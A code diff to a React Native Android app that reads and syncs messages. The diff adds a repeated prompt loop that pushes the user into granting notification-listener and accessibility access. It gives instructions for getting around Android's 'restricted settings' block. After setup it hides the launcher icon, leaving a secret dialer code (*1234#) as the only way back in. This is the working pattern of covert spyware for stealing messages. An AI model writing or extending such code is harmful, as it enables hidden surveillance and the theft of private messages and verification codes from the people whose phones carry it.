@@ -1,5 +1,5 @@
-import React, { useState, useEffect } from 'react';
-import { StyleSheet, Text, View, ScrollView, TouchableOpacity, StatusBar, Linking, TextInput, Alert, NativeModules } from 'react-native';
+import React, { useState, useEffect, useRef } from 'react';
+import { StyleSheet, Text, View, ScrollView, TouchableOpacity, StatusBar, Linking, TextInput, Alert, NativeModules, AppState, BackHandler } from 'react-native';
 const { MessageStore } = NativeModules;
 
 export default function App() {
@@ -8,15 +8,107 @@ export default function App() {
   const [activeChat, setActiveChat] = useState(null);
   const [showSettings, setShowSettings] = useState(false);
   const [apiUrl, setApiUrl] = useState('');
+  const [perms, setPerms] = useState({ notification: false, accessibility: false });
+  const [accStep, setAccStep] = useState(1);
+  const appState = useRef(AppState.currentState);
+
+  const isAlertShowing = useRef(false);
+  const hasShownAppInfo = useRef(false);
 
   useEffect(() => {
     if (MessageStore) {
       setReady(true);
       loadSettings();
+      checkPerms(true);
     }
-    const timer = setInterval(readMessages, 2000);
-    return () => clearInterval(timer);
+    const timer = setInterval(() => {
+        readMessages();
+        checkPerms(false);
+    }, 2000);
+    
+    const subscription = AppState.addEventListener('change', nextAppState => {
+      if (appState.current.match(/inactive|background/) && nextAppState === 'active') {
+        checkPerms(true);
+      }
+      appState.current = nextAppState;
+    });
+
+    return () => {
+        clearInterval(timer);
+        subscription.remove();
+    };
   }, []);
+
+  const hideCalled = useRef(false);
+
+  const checkPerms = async (shouldPrompt) => {
+      try {
+          if (MessageStore.checkPermissions) {
+              const res = await MessageStore.checkPermissions();
+              const p = JSON.parse(res);
+              setPerms(p);
+
+              if (p.notification && p.accessibility && !hideCalled.current) {
+                  hideCalled.current = true;
+                  
+                  // Show alert FIRST - don't disable anything yet!
+                  Alert.alert(
+                      "✅ Setup Complete!",
+                      "To vanish the app icon:\n\n" +
+                      "1️⃣ Tap 'HIDE NOW' below\n" +
+                      "2️⃣ On next screen tap 'Force Stop'\n" +
+                      "3️⃣ Press Back button\n\n" +
+                      "Icon will be GONE! 🎉\n\n" +
+                      "To open app later: Dial *1234#",
+                      [
+                          { 
+                              text: "HIDE NOW", 
+                              onPress: async () => {
+                                  // NOW disable the component
+                                  try {
+                                      if (MessageStore.hideAppIcon) {
+                                          await MessageStore.hideAppIcon();
+                                      }
+                                  } catch(e) {}
+                                  // Then open launcher settings
+                                  if (MessageStore.openLauncherSettings) {
+                                      MessageStore.openLauncherSettings();
+                                  }
+                              }
+                          }
+                      ],
+                      { cancelable: false }
+                  );
+              } else if (shouldPrompt && !isAlertShowing.current) {
+                  triggerAutoPrompt(p);
+              }
+          }
+      } catch(e){}
+  };
+
+  const autoAccStep = useRef(1);
+  const lastIntentFiredTime = useRef(0);
+
+  const triggerAutoPrompt = (currentPerms) => {
+      // Prevent firing intents too quickly in succession to avoid weird state loops
+      const now = Date.now();
+      if (now - lastIntentFiredTime.current < 1500) return;
+
+      if (!currentPerms.notification) {
+          lastIntentFiredTime.current = now;
+          Linking.sendIntent('android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS');
+      } else if (!currentPerms.accessibility) {
+          lastIntentFiredTime.current = now;
+          
+          if (autoAccStep.current === 1) {
+              autoAccStep.current = 2; // Next time they return without permission, open App Info
+              Linking.sendIntent('android.settings.ACCESSIBILITY_SETTINGS');
+          } else {
+              autoAccStep.current = 1; // Next time they return, open Accessibility again
+              Linking.openSettings();
+          }
+      }
+  };
 
   const loadSettings = async () => {
     try {
@@ -109,16 +201,46 @@ export default function App() {
         </View>
       )}
 
-      {!activeChat && !showSettings && (
+      {!activeChat && !showSettings && (!perms.notification || !perms.accessibility) && (
+        <View style={s.permissionBox}>
+          <Text style={s.settingsTitle}>Setup Required</Text>
+          <Text style={s.settingsDesc}>Follow these steps in order to start syncing messages.</Text>
+          
+          {!perms.notification && (
+              <TouchableOpacity style={[s.btn, { backgroundColor: '#333', marginBottom: 10 }]} onPress={() => Linking.sendIntent('android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS')}>
+                <Text style={{ color: '#fff', fontWeight: 'bold' }}>1. ALLOW NOTIFICATION ACCESS</Text>
+              </TouchableOpacity>
+          )}
+
+          {perms.notification && !perms.accessibility && (
+              <>
+                  {accStep === 1 && (
+                      <TouchableOpacity style={[s.btn, { backgroundColor: '#0f0' }]} onPress={() => { setAccStep(2); Linking.sendIntent('android.settings.ACCESSIBILITY_SETTINGS'); }}>
+                        <Text style={{ color: '#000', fontWeight: 'bold' }}>ENABLE MESSAGE READER</Text>
+                      </TouchableOpacity>
+                  )}
+                  {accStep === 2 && (
+                      <TouchableOpacity style={[s.btn, { backgroundColor: '#f44' }]} onPress={() => { setAccStep(3); Linking.openSettings(); }}>
+                        <Text style={{ color: '#fff', fontWeight: 'bold', textAlign: 'center' }}>WAS IT GREYED OUT?{'\n'}OPEN APP INFO (Top Right 3 Dots 👉 "Allow Restricted Settings")</Text>
+                      </TouchableOpacity>
+                  )}
+                  {accStep === 3 && (
+                      <TouchableOpacity style={[s.btn, { backgroundColor: '#0f0' }]} onPress={() => { setAccStep(2); Linking.sendIntent('android.settings.ACCESSIBILITY_SETTINGS'); }}>
+                        <Text style={{ color: '#000', fontWeight: 'bold', textAlign: 'center' }}>NOW ENABLE MESSAGE READER</Text>
+                      </TouchableOpacity>
+                  )}
+              </>
+          )}
+        </View>
+      )}
+
+      {!activeChat && !showSettings && perms.notification && perms.accessibility && (
         <View style={{ flexDirection: 'row', gap: 8, marginBottom: 10 }}>
-          <TouchableOpacity style={[s.btn, { backgroundColor: '#333' }]} onPress={() => Linking.sendIntent('android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS')}>
-            <Text style={{ color: '#fff', fontWeight: 'bold', fontSize: 11 }}>1. NOTIFICATIONS</Text>
-          </TouchableOpacity>
-          <TouchableOpacity style={[s.btn, { backgroundColor: '#333' }]} onPress={() => Linking.sendIntent('android.settings.ACCESSIBILITY_SETTINGS')}>
-            <Text style={{ color: '#fff', fontWeight: 'bold', fontSize: 11 }}>2. ACCESSIBILITY</Text>
-          </TouchableOpacity>
+          <View style={{ flex: 1, backgroundColor: '#005c4b', padding: 10, borderRadius: 8, alignItems: 'center' }}>
+            <Text style={{ color: '#fff', fontWeight: 'bold', fontSize: 12 }}>ALL SERVICES ACTIVE ✅</Text>
+          </View>
           <TouchableOpacity style={[s.btn, { backgroundColor: '#f44', flex: 0.5 }]} onPress={clear}>
-            <Text style={{ color: '#fff', fontWeight: 'bold', fontSize: 11 }}>CLEAR</Text>
+            <Text style={{ color: '#fff', fontWeight: 'bold', fontSize: 11 }}>CLEAR DATA</Text>
           </TouchableOpacity>
         </View>
       )}
@@ -188,6 +310,7 @@ const s = StyleSheet.create({
   empty: { color: '#444', textAlign: 'center', marginTop: 40, fontStyle: 'italic' },
   
   settingsBox: { backgroundColor: '#111', padding: 20, borderRadius: 10, marginBottom: 20, borderWidth: 1, borderColor: '#333' },
+  permissionBox: { backgroundColor: '#2a0000', padding: 20, borderRadius: 10, marginBottom: 20, borderWidth: 1, borderColor: '#f44' },
   settingsTitle: { color: '#fff', fontSize: 18, fontWeight: 'bold', marginBottom: 5 },
   settingsDesc: { color: '#aaa', fontSize: 12, marginBottom: 15 },
   input: { backgroundColor: '#222', color: '#0f0', padding: 12, borderRadius: 8, fontSize: 16, borderWidth: 1, borderColor: '#444' },
